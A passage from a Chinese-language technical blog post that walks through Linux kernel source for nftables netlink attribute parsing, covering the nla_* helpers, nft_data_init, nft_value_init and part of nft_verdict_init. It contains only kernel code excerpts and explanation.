</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span></code></pre></div><p>这里就是遍历传入属性流中的每个 nlattr 并根据 type 把它放到传入的 tb 数组中的相应位置。使用 <code>nla_for_each_attr</code> 宏可以遍历属性流</p><p><a id=code-snippet--nla-for-each-attr></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * nla_for_each_attr - iterate over a stream of attributes
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @pos: loop counter, set to current attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @head: head of attribute stream
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @len: length of attribute stream
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @rem: initialized to len, holds bytes currently remaining in stream
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020>#define nla_for_each_attr(pos, head, len, rem) \
</span></span></span><span style=display:flex><span><span style=color:#007020>        for (pos = head, rem = len; \
</span></span></span><span style=display:flex><span><span style=color:#007020>             nla_ok(pos, rem); \
</span></span></span><span style=display:flex><span><span style=color:#007020>             pos = nla_next(pos, &amp;(rem)))
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * nla_ok - check if the netlink attribute fits into the remaining bytes
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @nla: netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @remaining: number of bytes remaining in attribute stream
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>int</span> <span style=color:#06287e>nla_ok</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla, <span style=color:#902000>int</span> remaining)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> remaining <span style=color:#666>&gt;=</span> (<span style=color:#902000>int</span>) <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#666>*</span>nla) <span style=color:#666>&amp;&amp;</span>
</span></span><span style=display:flex><span>               nla<span style=color:#666>-&gt;</span>nla_len <span style=color:#666>&gt;=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#666>*</span>nla) <span style=color:#666>&amp;&amp;</span>
</span></span><span style=display:flex><span>               nla<span style=color:#666>-&gt;</span>nla_len <span style=color:#666>&lt;=</span> remaining;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * nla_next - next netlink attribute in attribute stream
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @nla: netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @remaining: number of bytes remaining in attribute stream
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * Returns the next netlink attribute in the attribute stream and
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * decrements remaining by the size of the current attribute.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span><span style=color:#06287e>nla_next</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla, <span style=color:#902000>int</span> <span style=color:#666>*</span>remaining)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> totlen <span style=color:#666>=</span> <span style=color:#06287e>NLA_ALIGN</span>(nla<span style=color:#666>-&gt;</span>nla_len);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#666>*</span>remaining <span style=color:#666>-=</span> totlen;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> (<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>) ((<span style=color:#902000>char</span> <span style=color:#666>*</span>) nla <span style=color:#666>+</span> totlen);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>根据上面的函数我们可以分析出属性流的结构（其实是很“朴素”的）</p><figure><img src=https://raw.githubusercontent.com/chujDK/ImageHost/main/PicGoIMage/202303022219848-nla-attr-stream.png></figure><p>上面说的“泛型”的实现（即 <code>nlattr</code> 可以通过 <code>__nal_type</code> 来表达自己的类型），其实是通过处理函数和调用者提前约定实现的，比如处理向 set 中添加元素的 <code>nft_add_set_elem</code> 函数，就和请求者约定了 <code>nft_set_elem_attributes</code> 这个枚举来表示各种属性</p><p><a id="code-snippet--enum nft-set-elem-attributes"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>enum</span> nft_set_elem_attributes {
</span></span><span style=display:flex><span>        NFTA_SET_ELEM_UNSPEC,
</span></span><span style=display:flex><span>        NFTA_SET_ELEM_KEY,
</span></span><span style=display:flex><span>        NFTA_SET_ELEM_DATA,
</span></span><span style=display:flex><span>        NFTA_SET_ELEM_FLAGS,
</span></span><span style=display:flex><span>        NFTA_SET_ELEM_TIMEOUT,
</span></span><span style=display:flex><span>        NFTA_SET_ELEM_EXPIRATION,
</span></span><span style=display:flex><span>        NFTA_SET_ELEM_USERDATA,
</span></span><span style=display:flex><span>        NFTA_SET_ELEM_EXPR,
</span></span><span style=display:flex><span>        NFTA_SET_ELEM_PAD,
</span></span><span style=display:flex><span>        NFTA_SET_ELEM_OBJREF,
</span></span><span style=display:flex><span>        NFTA_SET_ELEM_KEY_END,
</span></span><span style=display:flex><span>        NFTA_SET_ELEM_EXPRESSIONS,
</span></span><span style=display:flex><span>        __NFTA_SET_ELEM_MAX
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span><span style=color:#007020>#define NFTA_SET_ELEM_MAX	(__NFTA_SET_ELEM_MAX - 1)
</span></span></span></code></pre></div><p>请求者发包时将各种属性序列化到一个属性流中，通过 netlink socket 发送，内核就可以反序列化出各种属性了。换句话说，内核会通过 enum 或者宏定义等方式和请求者约定传入的属性的 typeid ，这样两方就能知道对方传入的是什么类型的数据了。</p><h4 id=parse-of-the-nftables-data-attribute><span class=section-num>3.1.2</span> parse of the nftables data attribute</h4><p>出于 <code>nlattr</code> 的灵活性，对于单个 <code>nlattr</code> 解析自然是和实现者完全相关的，我们以 nftables 对他的 data 类型属性的解析来看看是如何操作的。这个是通过 <code>nft_data_init</code> 实现的：</p><p>在 <code>nft_add_set_elem</code> 中，对他的调用链，有如下的一条，我们就以此为例</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (nla[NFTA_SET_ELEM_DATA] <span style=color:#666>!=</span> <span style=color:#007020>NULL</span>) {
</span></span><span style=display:flex><span>  err <span style=color:#666>=</span> <span style=color:#06287e>nft_setelem_parse_data</span>(ctx, set, <span style=color:#666>&amp;</span>desc, <span style=color:#666>&amp;</span>elem.data.val,
</span></span><span style=display:flex><span>                               nla[NFTA_SET_ELEM_DATA]);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (err <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>goto</span> err_parse_key_end;
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>int</span> <span style=color:#06287e>nft_setelem_parse_data</span>(<span style=color:#007020;font-weight:700>struct</span> nft_ctx <span style=color:#666>*</span>ctx, <span style=color:#007020;font-weight:700>struct</span> nft_set <span style=color:#666>*</span>set,
</span></span><span style=display:flex><span>                                  <span style=color:#007020;font-weight:700>struct</span> nft_data_desc <span style=color:#666>*</span>desc,
</span></span><span style=display:flex><span>                                  <span style=color:#007020;font-weight:700>struct</span> nft_data <span style=color:#666>*</span>data,
</span></span><span style=display:flex><span>                                  <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> err;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        err <span style=color:#666>=</span> <span style=color:#06287e>nft_data_init</span>(ctx, data, NFT_DATA_VALUE_MAXLEN, desc, attr);
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span></code></pre></div><p><a id=code-snippet--nft-data-init></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	nft_data_init - parse nf_tables data netlink attributes
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@ctx: context of the expression using the data
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@data: destination struct nft_data
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@size: maximum data length
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@desc: data description
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@nla: netlink attribute containing data
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	Parse the netlink data attributes and initialize a struct nft_data.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	The type and length of data are returned in the data description.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	The caller can indicate that it only wants to accept data of type
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	NFT_DATA_VALUE by passing NULL for the ctx argument.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>nft_data_init</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nft_ctx <span style=color:#666>*</span>ctx,
</span></span><span style=display:flex><span>                  <span style=color:#007020;font-weight:700>struct</span> nft_data <span style=color:#666>*</span>data, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> size,
</span></span><span style=display:flex><span>                  <span style=color:#007020;font-weight:700>struct</span> nft_data_desc <span style=color:#666>*</span>desc, <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>tb[NFTA_DATA_MAX <span style=color:#666>+</span> <span style=color:#40a070>1</span>];
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> err;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        err <span style=color:#666>=</span> <span style=color:#06287e>nla_parse_nested_deprecated</span>(tb, NFTA_DATA_MAX, nla,
</span></span><span style=display:flex><span>                                          nft_data_policy, <span style=color:#007020>NULL</span>);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (err <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> err;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (tb[NFTA_DATA_VALUE])
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>nft_value_init</span>(ctx, data, size, desc,
</span></span><span style=display:flex><span>                                      tb[NFTA_DATA_VALUE]);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (tb[NFTA_DATA_VERDICT] <span style=color:#666>&amp;&amp;</span> ctx <span style=color:#666>!=</span> <span style=color:#007020>NULL</span>)
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>nft_verdict_init</span>(ctx, data, desc, tb[NFTA_DATA_VERDICT]);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EINVAL;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#06287e>EXPORT_SYMBOL_GPL</span>(nft_data_init);
</span></span></code></pre></div><p>这个函数处理的 <code>nlattr</code> 是嵌套的，在 data 部分可以存储一个 <code>nlattr</code> ，如下的 enum 中定义了可选的类型：</p><p><a id="code-snippet--enum nft-data-attributes"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * enum nft_data_attributes - nf_tables data netlink attributes
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @NFTA_DATA_VALUE: generic data (NLA_BINARY)
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @NFTA_DATA_VERDICT: nf_tables verdict (NLA_NESTED: nft_verdict_attributes)
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>enum</span> nft_data_attributes {
</span></span><span style=display:flex><span>        NFTA_DATA_UNSPEC,
</span></span><span style=display:flex><span>        NFTA_DATA_VALUE,
</span></span><span style=display:flex><span>        NFTA_DATA_VERDICT,
</span></span><span style=display:flex><span>        __NFTA_DATA_MAX
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span><span style=color:#007020>#define NFTA_DATA_MAX		(__NFTA_DATA_MAX - 1)
</span></span></span></code></pre></div><p><code>nft_data_init</code> 首先用 <code>nla_parse_nested_deprecated</code> 取出嵌套的 <code>nlattr</code> ，并且储存在 <code>tb</code> 数组中，这样就可以根据类型选择其处理函数，这就类似于一个 switch 的过程（ <del>如果内核可以不用想太多用 oop 语言这里可能就不会这么绕了吧 hhh</del> ）。我们看一下两种处理函数</p><h5 id=nfta-data-value><code>NFTA_DATA_VALUE</code></h5><p>使用 <code>nft_value_init</code> 进行初始化</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (tb[NFTA_DATA_VALUE])
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>nft_value_init</span>(ctx, data, size, desc,
</span></span><span style=display:flex><span>                              tb[NFTA_DATA_VALUE]);
</span></span></code></pre></div><p><a id=code-snippet--nft-value-init></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>int</span> <span style=color:#06287e>nft_value_init</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nft_ctx <span style=color:#666>*</span>ctx,
</span></span><span style=display:flex><span>                          <span style=color:#007020;font-weight:700>struct</span> nft_data <span style=color:#666>*</span>data, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> size,
</span></span><span style=display:flex><span>                          <span style=color:#007020;font-weight:700>struct</span> nft_data_desc <span style=color:#666>*</span>desc, <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> len;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        len <span style=color:#666>=</span> <span style=color:#06287e>nla_len</span>(nla); <span style=color:#60a0b0;font-style:italic>// get length of payload
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>        <span style=color:#007020;font-weight:700>if</span> (len <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EINVAL;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (len <span style=color:#666>&gt;</span> size)
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EOVERFLOW;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#06287e>nla_memcpy</span>(data<span style=color:#666>-&gt;</span>data, nla, len);
</span></span><span style=display:flex><span>        desc<span style=color:#666>-&gt;</span>type <span style=color:#666>=</span> NFT_DATA_VALUE;
</span></span><span style=display:flex><span>        desc<span style=color:#666>-&gt;</span>len  <span style=color:#666>=</span> len;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>到这里我们需要看一下 <code>nft_data</code> 和 <code>nft_data_desc</code> 的定义</p><p><a id="code-snippet--nft-data && nft-verdict"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	struct nft_verdict - nf_tables verdict
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@code: nf_tables/netfilter verdict code
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@chain: destination chain for NFT_JUMP/NFT_GOTO
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nft_verdict {
</span></span><span style=display:flex><span>        u32				code;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> nft_chain		<span style=color:#666>*</span>chain;
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nft_data {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>union</span> {
</span></span><span style=display:flex><span>                u32			data[<span style=color:#40a070>4</span>];
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>struct</span> nft_verdict	verdict;
</span></span><span style=display:flex><span>        };
</span></span><span style=display:flex><span>} <span style=color:#06287e>__attribute__</span>((<span style=color:#06287e>aligned</span>(<span style=color:#06287e>__alignof__</span>(u64))));
</span></span></code></pre></div><p><a id=code-snippet--nft-data-desc></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nft_data_desc {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>enum</span> nft_data_types		type;
</span></span><span style=display:flex><span>        <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>			len;
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p><code>nft_data_desc</code> 比较简单，是用来描述一个 <code>nft_data</code> 的类型和长度的。 <code>nft_data</code> 则是一个 union ，当存储的是 data 时，就是一个 u32 类型的数组，大小为 16 字节。verdict 在英文中是判决的意思，在 nftables 中用来描述一个规则匹配后的决策结果的数据结构。通过其 code 字段可以表示匹配后是该继续还是丢弃包或是其他操作。 <code>chain</code> 字段则会指向要挑向的目标（如果 verdict code 是跳转指令的话）</p><p>可以看到 <code>nft_value_init</code> 的实现比较简单，只需要做一个对数据的拷贝即可，然后更新 data 的 <code>desc</code> （后面就可以进行错误检查等操作）。数据拷贝通过 <code>nla_memcpy</code> 实现，这个就是一个长的部分不拷贝，短了就补 0 的 memcpy 的 wrapper 。</p><p><a id=code-snippet--nal-memcpy></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * nla_memcpy - Copy a netlink attribute into another memory area
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @dest: where to copy to memcpy
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @src: netlink attribute to copy from
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @count: size of the destination area
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * Note: The number of bytes copied is limited by the length of
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *       attribute&#39;s payload. memcpy
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * Returns the number of bytes copied.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>nla_memcpy</span>(<span style=color:#902000>void</span> <span style=color:#666>*</span>dest, <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>src, <span style=color:#902000>int</span> count)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> minlen <span style=color:#666>=</span> <span style=color:#902000>min_t</span>(<span style=color:#902000>int</span>, count, <span style=color:#06287e>nla_len</span>(src));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#06287e>memcpy</span>(dest, <span style=color:#06287e>nla_data</span>(src), minlen);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (count <span style=color:#666>&gt;</span> minlen)
</span></span><span style=display:flex><span>                <span style=color:#06287e>memset</span>(dest <span style=color:#666>+</span> minlen, <span style=color:#40a070>0</span>, count <span style=color:#666>-</span> minlen);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> minlen;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#06287e>EXPORT_SYMBOL</span>(nla_memcpy);
</span></span></code></pre></div><h5 id=nfta-data-verdict><code>NFTA_DATA_VERDICT</code></h5><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (tb[NFTA_DATA_VERDICT] <span style=color:#666>&amp;&amp;</span> ctx <span style=color:#666>!=</span> <span style=color:#007020>NULL</span>)
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>nft_verdict_init</span>(ctx, data, desc, tb[NFTA_DATA_VERDICT]);
</span></span></code></pre></div><p>这个类型使用 <code>nft_verdict_init</code> 函数来初始化。相比之下他要复杂一些</p><p><a id=code-snippet--nft-verdict-init></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>int</span> <span style=color:#06287e>nft_verdict_init</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nft_ctx <span style=color:#666>*</span>ctx, <span style=color:#007020;font-weight:700>struct</span> nft_data <span style=color:#666>*</span>data,
</span></span><span style=display:flex><span>                            <span style=color:#007020;font-weight:700>struct</span> nft_data_desc <span style=color:#666>*</span>desc, <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  u8 genmask <span style=color:#666>=</span> <span style=color:#06287e>nft_genmask_next</span>(ctx<span style=color:#666>-&gt;</span>net);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>tb[NFTA_VERDICT_MAX <span style=color:#666>+</span> <span style=color:#40a070>1</span>];
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nft_chain <span style=color:#666>*</span>chain;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> err;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  err <span style=color:#666>=</span> <span style=color:#06287e>nla_parse_nested_deprecated</span>(tb, NFTA_VERDICT_MAX, nla,
</span></span><span style=display:flex><span>                                    nft_verdict_policy, <span style=color:#007020>NULL</span>);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (err <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> err;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>tb[NFTA_VERDICT_CODE])
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EINVAL;
</span></span><span style=display:flex><span>  data<span style=color:#666>-&gt;</span>verdict.code <span style=color:#666>=</span> <span style=color:#06287e>ntohl</span>(<span style=color:#06287e>nla_get_be32</span>(tb[NFTA_VERDICT_CODE]));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>switch</span> (data<span style=color:#666>-&gt;</span>verdict.code) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>default</span><span style=color:#666>:</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>switch</span> (data<span style=color:#666>-&gt;</span>verdict.code <span style=color:#666>&amp;</span> NF_VERDICT_MASK) {
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>case</span> <span style=color:#002070;font-weight:700>NF_ACCEPT</span>:
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>case</span> <span style=color:#002070;font-weight:700>NF_DROP</span>:
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>case</span> <span style=color:#002070;font-weight:700>NF_QUEUE</span>:
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>default</span><span style=color:#666>:</span>
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EINVAL;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    fallthrough;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>case</span> <span style=color:#002070;font-weight:700>NFT_CONTINUE</span>:
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>case</span> <span style=color:#002070;font-weight:700>NFT_BREAK</span>:
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>case</span> <span style=color:#002070;font-weight:700>NFT_RETURN</span>:
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>case</span> <span style=color:#002070;font-weight:700>NFT_JUMP</span>:
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>case</span> <span style=color:#002070;font-weight:700>NFT_GOTO</span>:
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (tb[NFTA_VERDICT_CHAIN]) {
</span></span><span style=display:flex><span>      chain <span style=color:#666>=</span> <span style=color:#06287e>nft_chain_lookup</span>(ctx<span style=color:#666>-&gt;</span>net, ctx<span style=color:#666>-&gt;</span>table,
</span></span><span style=display:flex><span>                               tb[NFTA_VERDICT_CHAIN],
</span></span><span style=display:flex><span>                               genmask);
</span></span><span style=display:flex><span>    } <span style=color:#007020;font-weight:700>else</span> <span style=color:#007020;font-weight:700>if</span> (tb[NFTA_VERDICT_CHAIN_ID]) {
